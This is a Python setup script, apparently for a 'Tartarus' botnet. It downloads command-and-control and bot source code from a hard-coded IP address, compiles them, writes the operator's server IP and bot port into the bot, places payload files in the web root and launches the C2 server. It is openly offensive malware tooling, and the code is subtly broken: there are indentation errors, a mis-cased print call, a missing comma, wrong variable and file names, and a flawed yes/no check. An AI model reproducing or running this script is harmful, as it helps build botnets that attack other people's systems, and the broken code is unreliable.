# Tartarus AutoSetup 
import subprocess, time

def vex(cmd):
    subprocess.call(cmd, shell=True)
def vexvain(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

Tartarus = "http://98.143.148.177"


print("Tartarus AutoSetup")

ip = raw_input("Server IP:")
Username = raw_input("Username:")
Password = raw_input("Password:")
CPort = raw_input("C2 Port:")
thread = raw_input("Desired Threads:")
BPort = raw_input("Botport:")
Bin = raw_input("Bin Names:")


print("Creating admin account for user:["+ Username +"]")
vex('echo '+ Username +' '+ Password +' admin >> arceus.txt')
time.sleep(2)
print("Finished!")
print("Downloading Tartarus C2..")
vex("wget -q "+ Tartarus +"/arc/c2.c -O arceus.c")
time.sleep(2)
print("Finished!")
print("Compiling Tartarus C2..")
vex('gcc -o arceus arceus.c -pthread')
time.sleep(2)
print("Finished!")
rm = raw_input("Would you like to delete the original .c file for arceus c2? (y/n):")
if rm == "y" or "Y":
vex("rm -rf arceus.c")
elif rm == "n" or "N":
print("Continuing..")
Print("Downloading Tartarus Bot..")
vex("wget -q "+ Tartarus +"/arc/bot.c -O bot.c")
time.sleep(2)
print("Finished!")
print("Downloading Cross-compiler..")
vex('wget -q '+ Tartarus +'/arc/arceus.py')
time.sleep(2)
print("Finished!")
vex('clear')
print("Changing information inside of the arceus client with user input..")
vexvain('bot.c' 178, 'unsigned char *Tartarus[] = {"'+ ip +':'+ BPort +'"};')
print("Compiling Bot..")
vex("python arceus.py client.c "+ ip +"")
vex('clear')
time.sleep(2)
print("Finished!")
print("Moving Cross-Compilers to Directory:[/root/Cross-Compilers]")
vex('mkdir Cross-Compilers && mv cross-compiler-* /root/Cross-Compilers')
time.sleep(2)
print("Finished!")

print("Changing Bin names with user input..")
vex('cd /var/www/html/ && cat bins.sh >> '+ Bin +'; rm -rf bins.sh')
time.sleep(2)
print("Finished!")

vex('screen -s ./arceus '+ BPort +' '+ Thread +' '+ CPort +'')

print("AutoSetup Finished!")
